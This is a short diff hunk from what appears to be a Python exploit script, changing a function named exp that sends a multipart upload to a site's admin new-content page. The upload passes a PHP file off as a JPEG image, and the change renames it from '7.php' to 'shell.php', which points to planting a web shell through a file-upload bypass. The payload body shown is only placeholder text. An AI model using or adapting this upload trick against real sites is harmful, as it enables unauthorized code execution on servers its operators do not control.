@@ -43,7 +43,7 @@ def exp(host, token, cookie_b):
         'Referer': host + '/admin/new-content',
     }
     data = '----------327107347321150223463725464476\n' \
-           + 'Content-Disposition: form-data; name="images[]"; filename="7.php"\n' \
+           + 'Content-Disposition: form-data; name="images[]"; filename="shell.php"\n' \
            + 'Content-Type: image/jpeg\n' \
            + '\n' \
            + '11111 \n' \
